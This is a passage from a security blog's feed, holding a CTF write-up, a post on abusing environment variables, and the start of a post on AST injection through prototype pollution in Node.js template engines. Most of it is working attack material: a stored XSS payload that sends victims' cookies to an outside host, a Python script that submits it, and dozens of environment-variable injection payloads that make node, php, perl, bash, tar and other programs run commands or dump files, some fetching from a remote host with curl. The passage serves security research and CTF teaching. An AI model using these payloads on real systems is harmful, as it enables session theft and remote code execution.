class="string">&quot;&lt;/a&lt;a&gt;&lt;a&gt;&lt;a&lt;a\x0ba &quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">parse</span>(<span class="title function_">sanitize</span>(html)).<span class="property">outerHTML</span>); <span class="comment">// &lt;a&gt;&lt;/a&lt;/a&gt;&lt;a a&gt;&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><code>node-html-parser</code> intends to misinterpret <code>\x0b</code> and unclosed closing html tag.<br>Such misinterpretion can be used to bypass non-script sanitizer like sanitize-html.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> marked = <span class="built_in">require</span>(<span class="string">&#x27;marked&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sanitizeHtml = <span class="built_in">require</span>(<span class="string">&#x27;sanitize-html&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> nodeHtmlParser = <span class="built_in">require</span>(<span class="string">&#x27;node-html-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> html = <span class="string">&quot;&lt;/header &lt;a&gt;&lt;a&gt;&lt;a&lt;a\x0bonx=a &quot;</span>;</span><br><span class="line"></span><br><span class="line">html = marked.<span class="title function_">parse</span>(html);</span><br><span class="line">html = <span class="title function_">sanitizeHtml</span>(html);</span><br><span class="line">html = nodeHtmlParser.<span class="title function_">parse</span>(html).<span class="property">outerHTML</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(html);</span><br></pre></td></tr></table></figure><p>When it comes to the case used with <code>marked</code>, The condition gets a little more complicated because <code>marked</code> also mutates input string.</p><p>So I wrote <a href="https://github.com/posix-lee/jsfuxx">a generic DOM based dumb fuzzer for javascript</a> to find. You can check the link If you interested.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mport requests, random</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;http://1.230.253.91:3000&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">res = s.post(HOST + <span class="string">&#x27;/login&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;posix&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1337&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">res = s.post(HOST + <span class="string">&#x27;/new&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;abcd&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content&#x27;</span>: <span class="string">&quot;&lt;/header &lt;a&gt;&lt;a\t&gt;&lt;h&lt;a\x0Bstyle=&#x27;animation-name:spinner-donut-anim&#x27;onanimationend=&#x27;fetch(`http:\\x2f\\x2fp6.is\\x2f$&#123;document.cookie&#125;`)&#x27; &quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>So above is the intended solution creates a note including XSS payload doesn’t require any user-interaction.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Cyberchef-Cyber-Headchef&quot;&gt;&lt;a href=&quot;#Cyberchef-Cyber-Headchef&quot; class=&quot;headerlink&quot; title=&quot;Cyberchef, Cyber Headchef&quot;&gt;&lt;/a&gt;Cyberchef, Cy
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Abusing Environment Variables</title>
    <link href="https://blog.p6.is/Abusing-Environment-Variables/"/>
    <id>https://blog.p6.is/Abusing-Environment-Variables/</id>
    <published>2020-09-06T12:12:17.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> This article includes solution of <a href="http://challenge.p6.is/0">http://challenge.p6.is/0</a></p></blockquote><p><img src="/img/2020/09/1.png" alt="image-20200906210533589"></p><h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>I found interesting code while do an analysis of the effects of nodejs internal effects.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (options.<span class="property">shell</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> command = [file].<span class="title function_">concat</span>(args).<span class="title function_">join</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">  <span class="comment">// Set the shell, switches, and commands.</span></span><br><span class="line">  <span class="keyword">if</span> (process.<span class="property">platform</span> === <span class="string">&#x27;win32&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">shell</span> === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">      file = options.<span class="property">shell</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      file = process.<span class="property">env</span>.<span class="property">comspec</span> || <span class="string">&#x27;cmd.exe&#x27;</span>;</span><br><span class="line">    <span class="comment">// &#x27;/d /s /c&#x27; is used only for cmd.exe.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:.*\\)?cmd(?:\.exe)?$/i</span>.<span class="title function_">test</span>(file)) &#123;</span><br><span class="line">      args = [<span class="string">&#x27;/d&#x27;</span>, <span class="string">&#x27;/s&#x27;</span>, <span class="string">&#x27;/c&#x27;</span>, <span class="string">`&quot;<span class="subst">$&#123;command&#125;</span>&quot;`</span>];</span><br><span class="line">      windowsVerbatimArguments = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      args = [<span class="string">&#x27;-c&#x27;</span>, command];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">shell</span> === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">      file = options.<span class="property">shell</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (process.<span class="property">platform</span> === <span class="string">&#x27;android&#x27;</span>)</span><br><span class="line">      file = <span class="string">&#x27;/system/bin/sh&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      file = <span class="string">&#x27;/bin/sh&#x27;</span>;</span><br><span class="line">    args = [<span class="string">&#x27;-c&#x27;</span>, command];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>through <a href="https://github.com/nodejs/node/blob/master/lib/child_process.js#L502">https://github.com/nodejs/node/blob/master/lib/child_process.js#L502</a>, in the child_process, one of builtin module of nodejs.<br>By specifying the shell option, I was able to override the default shell used to run the command.</p><p>and from <a href="https://github.com/nodejs/node/blob/master/lib/child_process.js#L528">https://github.com/nodejs/node/blob/master/lib/child_process.js#L528</a><br>We could know the child processes creation uses <code>for ... in</code> loop for setting child process’s environment variabless<br>it can be seen that the environment variables are also referred to Object.prototype.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> child_process = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">shell</span> = <span class="string">&#x27;node&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">env</span> = &#123;</span><br><span class="line">   <span class="variable constant_">NODE_DEBUG</span> : <span class="string">&#x27;1; throw require(&quot;child_process&quot;).execSync(&quot;sleep 7&quot;).toString()//&#x27;</span>,</span><br><span class="line">   <span class="variable constant_">NODE_OPTIONS</span> : <span class="string">&#x27;-r /proc/self/environ&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">child_process.<span class="title function_">execSync</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure><p>By overriding Object.prototype.shell, We can run any binary and make command execution even if the origin command is not vulnerable for this.</p><p>However, since nodejs have context-dependency in order of environment variables in &#x2F;proc&#x2F;self&#x2F;environ when creating child processes.<br>I want to know about other general binaries have detected how attacks can be carried out.</p><p>After searching a time, I could found an interesting <a href="https://www.elttam.com/blog/env/">article</a></p><p>Several interpreter languages have been able to carry out attacks in this way.<br>We’ve opened the challenge for more diverse navigation and data collection.</p><p>As a result, many people showed interesting solutions.<br>Thank you to <a href="https://twitter.com/KuroNeko10x">@KuroNeko10x</a> <a href="https://twitter.com/SecurityMB">@SecurityMB</a> <a href="https://twitter.com/acut3hack">acut3hack</a> <a href="https://twitter.com/panghoddari">@panghoddari</a> <a href="https://twitter.com/HunterGregal">@HunterGregal</a> jinmo123 dmbs335 <a href="https://twitter.com/03sunf">@03sunf</a> <a href="https://twitter.com/nko_d8">NGA</a> <a href="https://twitter.com/__Sehun_Oh__">@shpik</a> <a href="https://twitter.com/r0hanSH">@r0hanSH</a> for participating.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="x2F-usr-x2F-bin-x2F-node"><a href="#x2F-usr-x2F-bin-x2F-node" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;node"></a>&#x2F;usr&#x2F;bin&#x2F;node</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/node</span><br><span class="line">&amp;p[]=NODE_OPTIONS=--require /proc/self/environ</span><br><span class="line">&amp;p[]=PHP_EXTRA_CONFIGURE_ARGS=console.log(require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag/f1444g&#x27;).toString())//</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-local-x2F-bin-x2F-php"><a href="#x2F-usr-x2F-local-x2F-bin-x2F-php" class="headerlink" title="&#x2F;usr&#x2F;local&#x2F;bin&#x2F;php"></a>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/bin/php</span><br><span class="line">&amp;p[]=PHP_EXTRA_CONFIGURE_ARGS=1;%0dauto_prepend_file=/proc/self/environ;%0d&lt;?php system(&quot;cat /flag/f1444g&quot;);?&gt;</span><br><span class="line">&amp;p[]=PHPRC=/proc/self/environ</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-perl"><a href="#x2F-usr-x2F-bin-x2F-perl" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;perl"></a>&#x2F;usr&#x2F;bin&#x2F;perl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/perl</span><br><span class="line">&amp;p[]=PERL5OPT=d</span><br><span class="line">&amp;p[]=PERL5DB=BEGIN&#123;$f=`ls /flag`; print `cat /flag/$f`&#125;</span><br></pre></td></tr></table></figure><h2 id="x2F-bin-x2F-bash"><a href="#x2F-bin-x2F-bash" class="headerlink" title="&#x2F;bin&#x2F;bash"></a>&#x2F;bin&#x2F;bash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/bin/bash</span><br><span class="line">&amp;p[]=BASH_ENV=`curl p6.is`</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-bashbug"><a href="#x2F-usr-x2F-bin-x2F-bashbug" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;bashbug"></a>&#x2F;usr&#x2F;bin&#x2F;bashbug</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/bashbug</span><br><span class="line">&amp;p[]=DEFEDITOR=cat /flag/* &gt;</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-less"><a href="#x2F-usr-x2F-bin-x2F-less" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;less"></a>&#x2F;usr&#x2F;bin&#x2F;less</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/less</span><br><span class="line">&amp;p[]=LESSOPEN=curl p6.is</span><br><span class="line">&amp;p[]=LESS=-?/bin/ls</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-vim"><a href="#x2F-usr-x2F-bin-x2F-vim" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;vim"></a>&#x2F;usr&#x2F;bin&#x2F;vim</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/vim</span><br><span class="line">&amp;p[]=VIMINIT=exe &quot;!/usr/bin/rgrep . /flag&quot; | q!</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-byobu-status-detail"><a href="#x2F-usr-x2F-bin-x2F-byobu-status-detail" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;byobu-status-detail"></a>&#x2F;usr&#x2F;bin&#x2F;byobu-status-detail</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/byobu-status-detail</span><br><span class="line">&amp;p[]=PATH=/bin</span><br><span class="line">&amp;p[]=BYOBU_INCLUDED_LIBS=1</span><br><span class="line">&amp;p[]=BYOBU_PAGER=/bin/cat /flag/*</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-byobu"><a href="#x2F-usr-x2F-bin-x2F-byobu" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;byobu"></a>&#x2F;usr&#x2F;bin&#x2F;byobu</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/byobu</span><br><span class="line">&amp;p[]=BYOBU_CONFIG_DIR=/var/www/html/</span><br><span class="line">&amp;p[]=BYOBU_RUN_DIR=/tmp</span><br><span class="line">&amp;p[]=BYOBU_INCLUDED_LIBS=1</span><br><span class="line">&amp;p[]=HOME=/var/cache/apache2/mod_cache_disk</span><br><span class="line">&amp;p[]=BYOBU_TEST=cd /; ls -al /home &gt; /var/www/html/eyo 2&gt;</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-file"><a href="#x2F-usr-x2F-bin-x2F-file" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;file"></a>&#x2F;usr&#x2F;bin&#x2F;file</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/file</span><br><span class="line">&amp;p[]=MAGIC=/flag/::</span><br></pre></td></tr></table></figure><h2 id="x2F-bin-x2F-tar"><a href="#x2F-bin-x2F-tar" class="headerlink" title="&#x2F;bin&#x2F;tar"></a>&#x2F;bin&#x2F;tar</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/bin/tar</span><br><span class="line">&amp;p[]=TAPE=/dev/null</span><br><span class="line">&amp;p[]=TAR_OPTIONS=-x --use-compress-program=&quot;sh -c \&quot;rgrep . /flag &gt;&amp;2\&quot;&quot;</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-gs"><a href="#x2F-usr-x2F-bin-x2F-gs" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;gs"></a>&#x2F;usr&#x2F;bin&#x2F;gs</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/gs</span><br><span class="line">&amp;p[]=GS_DEVICE=bit</span><br><span class="line">&amp;p[]=GS_OPTIONS=@/flag/f1444g</span><br></pre></td></tr></table></figure><h2 id="x2F-bin-x2F-bzip2"><a href="#x2F-bin-x2F-bzip2" class="headerlink" title="&#x2F;bin&#x2F;bzip2"></a>&#x2F;bin&#x2F;bzip2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/bin/bzip2</span><br><span class="line">&amp;p[]=BZIP=/flag/f1444g</span><br></pre></td></tr></table></figure><h2 id="x2F-bin-x2F-tar-1"><a href="#x2F-bin-x2F-tar-1" class="headerlink" title="&#x2F;bin&#x2F;tar"></a>&#x2F;bin&#x2F;tar</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/bin/tar</span><br><span class="line">&amp;p[]=TAPE=/usr/src/php.tar.xz</span><br><span class="line">&amp;p[]=TAR_OPTIONS=-x --to-command=&quot;rgrep . /flag&quot;</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-rake"><a href="#x2F-usr-x2F-bin-x2F-rake" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;rake"></a>&#x2F;usr&#x2F;bin&#x2F;rake</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/rake</span><br><span class="line">&amp;p[]=RAKEOPT=-e &quot;print `rgrep . /flag`&quot;</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-xz"><a href="#x2F-usr-x2F-bin-x2F-xz" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;xz"></a>&#x2F;usr&#x2F;bin&#x2F;xz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/xz</span><br><span class="line">&amp;p[]=XZ_OPT=--files=/flag/f1444g</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-zipinfo"><a href="#x2F-usr-x2F-bin-x2F-zipinfo" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;zipinfo"></a>&#x2F;usr&#x2F;bin&#x2F;zipinfo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/zipinfo</span><br><span class="line">&amp;p[]=ZIPINFO=-s /flag/*</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-zip"><a href="#x2F-usr-x2F-bin-x2F-zip" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;zip"></a>&#x2F;usr&#x2F;bin&#x2F;zip</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/zip</span><br><span class="line">&amp;p[]=ZIPOPT=/tmp/a.zip -T -TT`cat$IFS$1/flag/f1444g;`</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/zip</span><br><span class="line">&amp;p[]=ZIP=-0 -r - /flag</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-unzip"><a href="#x2F-usr-x2F-bin-x2F-unzip" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;unzip"></a>&#x2F;usr&#x2F;bin&#x2F;unzip</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/bin/unzip</span><br><span class="line">&amp;p[]=UNZIP=-p /tmp/pwn.zip</span><br></pre></td></tr></table></figure><h2 id="x2F-bin-x2F-grep"><a href="#x2F-bin-x2F-grep" class="headerlink" title="&#x2F;bin&#x2F;grep"></a>&#x2F;bin&#x2F;grep</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/bin/grep</span><br><span class="line">&amp;p[]=GREP_OPTIONS=-r . /flag</span><br></pre></td></tr></table></figure><hr><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><blockquote><p> The extra solutions were not valid for this challenge.</p></blockquote><h2 id="x2F-usr-x2F-bin-x2F-systemctl"><a href="#x2F-usr-x2F-bin-x2F-systemctl" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;systemctl"></a>&#x2F;usr&#x2F;bin&#x2F;systemctl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PAGER=&#x27;ls /&#x27; systemctl</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-python"><a href="#x2F-usr-x2F-bin-x2F-python" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;python"></a>&#x2F;usr&#x2F;bin&#x2F;python</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PYTHONSTARTUP=&#x27;/etc/passwd&#x27; python</span><br></pre></td></tr></table></figure><h2 id="x2F-usr-x2F-bin-x2F-perl-1"><a href="#x2F-usr-x2F-bin-x2F-perl-1" class="headerlink" title="&#x2F;usr&#x2F;bin&#x2F;perl"></a>&#x2F;usr&#x2F;bin&#x2F;perl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PERL5OPT=&#x27;-Mbase;print(`id`)&#x27; perl /dev/null</span><br></pre></td></tr></table></figure><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://www.elttam.com/blog/env/">https://www.elttam.com/blog/env/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt; This article includes solution of &lt;a href=&quot;http://challenge.p6.is/0&quot;&gt;http://challenge.p6.is/0&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img
      
    
    </summary>
    
    
      <category term="Docs" scheme="https://blog.p6.is/category/docs/"/>
    
    
  </entry>
  
  <entry>
    <title>AST Injection, Prototype Pollution to RCE</title>
    <link href="https://blog.p6.is/AST-Injection/"/>
    <id>https://blog.p6.is/AST-Injection/</id>
    <published>2020-08-04T13:42:34.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>This article describes how to trigger RCE<br>in two well-known template engines,<br>using a new technique called AST Injection.</p></blockquote><h2 id="AST-Injection"><a href="#AST-Injection" class="headerlink" title="AST Injection"></a>AST Injection</h2><h3 id="What-is-AST"><a href="#What-is-AST" class="headerlink" title="What is AST?"></a>What is AST?</h3><blockquote><p><a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">https://en.wikipedia.org/wiki/Abstract_syntax_tree</a></p></blockquote><h3 id="AST-in-NodeJS"><a href="#AST-in-NodeJS" class="headerlink" title="AST in NodeJS"></a>AST in NodeJS</h3><p><img src="/img/2020/08/graph_2.png" alt="img"></p><p>In NodeJS, AST is used in JS really often, as template engines and typescript etc.<br>For the template engine, the structure is as shown above.</p><p><img src="/img/2020/08/graph_3.jpg" alt="img"></p><p>If prototype pollution vulnerability exists in the JS application,<br>Any AST can be inserted in the function by making it insert during the <code>Parser</code> or <code>Compiler</code> process.</p><p>Here, you can insert AST without proper filtering of input (which has not been properly filtered) that has not been verified by lexer or parser.<br>Then, we can give unexpected input to the compiler.</p><p>Below is how to actually use AST Injection to execute arbitrary commands in <code>handlebars</code> and <code>pug</code></p><h2 id="Handlebars"><a href="#Handlebars" class="headerlink" title="Handlebars"></a>Handlebars</h2><p><img src="/img/2020/08/graph_4.jpg" alt="img"></p><p>Until today, <code>handlebars</code> has been downloaded a total of <code>998,602,213</code> times.<br>Handlebars are the most commonly used template engine except for ejs.</p><p>For newer versions, it is known to be safe because no command can be executed, even if any template can be inserted.</p><h3 id="How-to-Detect"><a href="#How-to-Detect" class="headerlink" title="How to Detect"></a>How to Detect</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`Hello &#123;&#123; msg &#125;&#125;`</span>;</span><br><span class="line"><span class="keyword">const</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;posix&quot;</span>&#125;)); <span class="comment">// Hello posix</span></span><br></pre></td></tr></table></figure><p>Before you start, here’s how to use templates in handlebars.<br>The Handlebar.compile function converts a string into a template function and passes object factors for reference.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pendingContent</span> = <span class="string">`&lt;script&gt;alert(origin)&lt;/script&gt;`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`Hello &#123;&#123; msg &#125;&#125;`</span>;</span><br><span class="line"><span class="keyword">const</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">template</span>(&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;posix&quot;</span>&#125;)); <span class="comment">// &lt;script&gt;alert(origin)&lt;/script&gt;Hello posix</span></span><br></pre></td></tr></table></figure><p>In here, we can make influence to the compilation process using prototype pollution.</p><p>You can insert any string into <code>Object.prototype.pendingContent</code> to determine the possibility of an attack.<br>This allows you to be sure that servers are using handlebars engine when a prototype pollution exists in a black-box environment.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>handlebars/dist/cjs/handlebars/compiler/javascript-compiler.<span class="property">js</span> --&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="attr">appendContent</span>: <span class="keyword">function</span> <span class="title function_">appendContent</span>(<span class="params">content</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">this</span>.<span 